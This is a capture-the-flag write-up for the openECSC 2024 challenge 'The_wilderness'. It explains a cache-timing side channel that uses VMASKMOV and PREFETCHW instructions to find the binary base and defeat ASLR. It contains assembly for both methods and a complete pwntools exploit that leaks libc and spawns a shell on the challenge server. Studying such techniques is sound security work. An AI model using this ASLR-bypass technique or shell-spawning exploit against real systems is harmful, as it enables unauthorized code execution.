# Overview
HEY YOU! Tired of the chaos caused by memory mappings landing just about anywhere?😤 Today, we’re turning the tables on ASLR with a **WILD** cache timing attack!

**Challenge:** [The_wilderness](https://open.ecsc2024.it/challenges#challenge-19) (openECSC 2024 round 2) 
**Attack Type:** Timing caches accesses to leak binary base.
# Introduction
This challenge is pretty straightforward, a new memory mapping is created at a fixed address and the user’s shellcode is readed into it. All registers are zeroed out, and the execution of the user’s code starts.

The shellcode can contain anything, with the sole exceptions being the syscall instructions (syscall, int 0x80, sysenter). Additionally, null bytes are not permitted, while not posing a problem, this is super annoying.

The challenge is executed through an emulator (intel sde64) with CET enabled. 
# The Big Plan
We have the freedom to write any shellcode, but to pop a shell, we need a syscall instruction, which can be found in the libc, hence, we need to leak it. Since all registers have been zeroed out, and the binary has PIE, we don’t know where any mapping is.

The intended solution for the challenge involves using the shadow stack, but that’s **B O R I N G**, and also relies on the fact that CET is enabled. 
We’re going to take a cooler route instead: if we don’t know where any mapping is, we just need to *scan the **entire** memory* until we find one!
### But Wait, How Are We Going to Do That?
If we start randomly dereferencing pointers until we find a valid memory address, we would segfault on any invalid pointer, so that’s not an option. However, there are two ways to check if an address is valid without segfaulting:

1. **System calls are designed to be safe**: When a syscall is made, the kernel takes control and executes the requested operation. The kernel is responsible for ensuring that the syscall is executed safely and correctly. If the syscall encounters an error, the kernel will return an error code to the user space program, rather than causing a crash.
   This means that we can check if an address is valid by using syscalls such as read or write. If an invalid address is given to them, they will just return -1 and set errno to “EFAULT”. So, it is possible to use these to scan memory until anything but an error is returned!
 2. **Time Memory Access**: There are two families of assembly instructions, that I’m aware of, that can access invalid memory without crashing the program. These instructions won’t give us any direct error, but will take a different amount of time to execute based on whether the memory we are trying to access is cached or not. This can be exploited. 
 
Since we cannot make any syscall, our only option is the second one!
# Introducing: VMASKMOV and PREFETCHh
#### VMASKMOV
This is a family of assembly instructions used to load values into SIMD registers. Each instruction uses two operands in addition to the register to load:

1. A register containing a bit mask.
2. The memory location of the value to load. 
Since these registers can contain different data types, a bit mask is required to specify it. 
But here’s the trick: if the bit mask is set to all 0s, no value will be loaded into the register, but _the CPU will attempt to fetch it anyway!_ The result of this is that if an invalid pointer is used with a zeroed bit mask, no segfault will occur! 

When i discovered that, i was blown away!🤯 Why is that even possible?! Who thought this was a good idea? 
Well, if you make possible to dereference any pointer without segfaulting, *don't mind if i do!* 😈
#### PREFETCHh
This is a family of instructions used to move the specified pice of data from the RAM to the cache for optimization purposes. On invalid pointers, this family of instructions won’t cause a segfault either.
## Memory Behavior
Since both instruction families need to retrieve a value from memory, the first thing done is to look into the *cache*. If the value is found there, there is no need to look further; otherwise, the *RAM* is searched. 
Both memory types of memory are really fast to access, **however**, accessing the former is significantly faster than the latter. Timing how much time an instruction takes to execute tells us whether the target value was found in the cache or if the RAM was searched.
## Exploitation Strategy
We are going to exploit the fact that valid memory can be cached, while invalid memory cannot, for obvious reasons. We will attempt to access each memory location twice. Depending on whether that location is valid memory or not, we would observe two different behaviors:
1. **Valid Memory**: The memory could be cached or not. If it isn’t, the CPU will cache it now. This ensures that on the second access, the memory will be cached and this access will be fast.
2. **Invalid Memory**: In this case, the CPU will first search the cache and then the RAM. The key takeaway is that on an invalid address, the RAM will always be searched, so the instruction will always take a longer time to execute. 
## CPU Speculation
Modern CPUs employ a technique known as **speculative execution** to enhance performance. This process involves the CPU making educated guesses about future instructions and executing them in advance. While this can  boost efficiency, it can lead to unintended side effects in our context.
Speculative execution can cause our timing measurements to be inaccurate, as the CPU might execute instructions ahead of time, impairing our ability to distinguish between valid and invalid memory based on execution time.

To mitigate this issue, we employ **fence instructions**. These instructions act as barriers that prevent the CPU from executing subsequent instructions until the previous ones have completed.
## RDTSC
To measure time, we will directly use the processor’s timestamp. The `rdtsc` instruction will read this timestamp for us and store it in the RAX register.
# Leaking the Binary Base with VMASKMOV
Now it’s time to roll up our sleeves and craft the exploit! In order to distinguish between valid and invalid memory, we need a threshold time. 
To make our exploit portable, the optimal approach is to calculate this threshold during each execution. We do this by measuring the time it takes to access a valid memory address 1024 times and then calculating the average. Our threshold will be this value multiplied by 1.2 to provide some margin. Based on my measurements, accessing the RAM takes 6-7 times longer than accessing the cache (with `lfence`).

Our search will begin at the address `0x550000000000`, since binaries are loaded above this address. Each step will be of `0x1000` bytes since memory mappings are aligned by that amount.
```asm
;mean time to access valid memory
xor r11,r11
mov rdi, 1024
.time:
    rdtsc
    mov rbp,rax
    lfence
    vmaskmovps ymm0, ymm0, [rip]
    lfence
    rdtsc
    sub rax,rbp
    add r11, rax
    dec rdi
    test rdi, rdi
jnz .time
shr r11, 10

;threshold = mean*1.2
imul r11,r11, 12
sar r11, 3

;search starting point
mov rdi, 0x550000000000
mov rsi, 0x1000
;test each memory address till the binary base is found
.find:
    add rdi, rsi
    vmaskmovps ymm0, ymm0, [rdi]
    lfence
    
    rdtsc
    mov ebp,eax
    vmaskmovps ymm0, ymm0, [rdi]
    lfence
    rdtsc
    
    sub eax,ebp
    cmp rax, r11
    jge .find
;binary base in rdi! 
```

# Leaking the Binary Base with PREFETCH
The PREFETCH family of instructions behaves a bit differently compared to VMASKMOV. Based on my measurements, accessing an invalid memory address takes between 1.5 to 2 times as long as accessing a valid one using `lfence`. Interestingly, for certain invalid memory addresses, it could take even less time.

For this reason, we won’t use the formula mentioned above for the threshold. Instead, we’ll calculate the average of 1024 valid memory accesses and add `0x05` to it. This will serve as our new threshold.

While `mfence` also works with VMASKMOV, I found that PREFETCH only works with `lfence`. 

```asm
;mean time to access valid memory
xor r11,r11
mov rdi, 1024
    .time:
        rdtsc
        mov ebp,eax
        lfence
        PREFETCHW [rip]
        lfence
        rdtsc
        sub eax,ebp
        add r11, rax
        dec rdi
        test rdi, rdi
    jnz .time
shr r11, 10

;threshold = mean +0x5
add r11 , 0x05

;search starting point
mov rdi, 0x550000000000
mov rsi, 0x1000

;test each memory address till the binary base is found
.find:
     add rdi, rsi
     PREFETCHW [rdi]
     lfence
     
     rdtsc
     mov ebp,eax
     lfence
     PREFETCHW [rdi]
     lfence
     rdtsc
     
     sub eax,ebp
     cmp rax, r11
     jge .find   
     
;binary base in rdi! 
```

## Conclusions and Final Exploit
I spent an entire week experimenting with this technique, striving to optimize it, and I must say, it was a thoroughly enjoyable process!😊 
Both PREFETCH and VMASKMOV proved to be highly effective, even though it took me several days to get PREFETCH to work. Both methods are reliable enough, making the same exploit work in more than 90% of cases, which is far more than I initially expected 🤓. After all, we are timing memory access, which could be influenced by a myriad of factors.

I’ll leave here the sources that aided me during this journey, as well as the final exploit used for the challenge. Since no null bytes were allowed in the shellcode, I had to get creative with bit shifting, which is why the code might look a bit convoluted. 
### Sources
https://amateurs.team/writeups/AmateursCTF-2023/perfect-sandbox
https://www.felixcloutier.com/x86/vmaskmov
https://www.felixcloutier.com/x86/prefetchh
https://www.felixcloutier.com/x86/prefetchw
https://www.felixcloutier.com/x86/rdtsc
https://ieeexplore.ieee.org/document/9833692
https://pwn.college/software-exploitation/speculative-execution/

## Final exploit
```python
#!/usr/bin/env python3

from pwn import *
exe = ELF("./the_wilderness_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
context.binary = exe
DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc thewilderness.challs.open.ecsc2024.it 38012"	# `nc <host> <port>`

from pwnlib.tubes.tube import tube
tube.s		= tube.send
tube.sa		= tube.sendafter
tube.sl		= tube.sendline
tube.sla	= tube.sendlineafter
tube.r		= tube.recv
tube.ru		= tube.recvuntil
tube.rl		= tube.recvline

ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
vleak = lambda valname, val: log.info(f"{valname}: 0x{val:x}")
chunks = lambda data, step: [data[i:i+step] for i in range(0, len(data), step)]

GDB_SCRIPT = """
"""

def conn():
    if args.REMOTE:
        return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))
    if args.GDB:
        return gdb.debug([exe.path], env={'dio':'cane'},gdbscript=GDB_SCRIPT, aslr = False)
    if args.DOCKER:
        return remote("localhost", DOCKER_PORT)
    return process([exe.path])

def main():
    
    io = conn()

    payload = '''
    endbr64
    mov rsp,rax
    
    //mean time to access valid memory
    xor r11,r11
    xor rdi, rdi
    inc rdi
    shl rdi, 10

    .time:
        rdtsc
        mov ebp,eax
        lfence
        PREFETCHW [rsp]
        lfence
        rdtsc
        sub eax,ebp
        add r11, rax
        dec rdi
        test rdi, rdi
    jnz .time
    shr r11, 10

    //threshold = mean +0x5
    add r11, 0x5 

    //binary starting value
    mov ch, 0x55
    shl rcx, 32
    mov rdi, rcx
    inc rsi
    shl rsi, 12
    mov rdi, rcx

    .find:
     add rdi, rsi
     PREFETCHW [rdi]
     lfence
     
     rdtsc
     mov ebp,eax
     lfence
     PREFETCHW [rdi]
     lfence
     rdtsc
     
     sub eax,ebp
     cmp rax, r11
     jge .find   
         
    //libc puts
    mov bx, 0x3f90
    add rdi, rbx
    mov rsi, [rdi]
    
    //libc base
    mov bx, 0x80e5
    shl rbx, 4
    sub rsi, rbx

    //libc syscall
    xor rbx,rbx
    mov bx, 0xa76d
    shl rbx, 2
    mov r10, rsi
    add r10, rbx
    
    //env
    mov rdx, rsi
    xor rsi, rsi
    mov esi, 0xff222201
    shr rsi,8
    shl rsi,8*6
    shr rsi,8*5
    add rsi, rdx

    //execve
    xor rax,rax
    mov al, 0x3b
    mov rdx, [rsi]
    xor rdi, rdi
    xor rdi, 0xdead150

    jmp r10
    '''
    
    payload = asm(payload).ljust(0x150, b'\x90') + b'/bin/sh'
    
    io.sl(f'{len(payload)}'.encode())
    log.info(f"payload: {payload.hex()}")
    io.sl(payload)
    io.sl("printenv")

    io.interactive()

if __name__ == "__main__":
    main()
```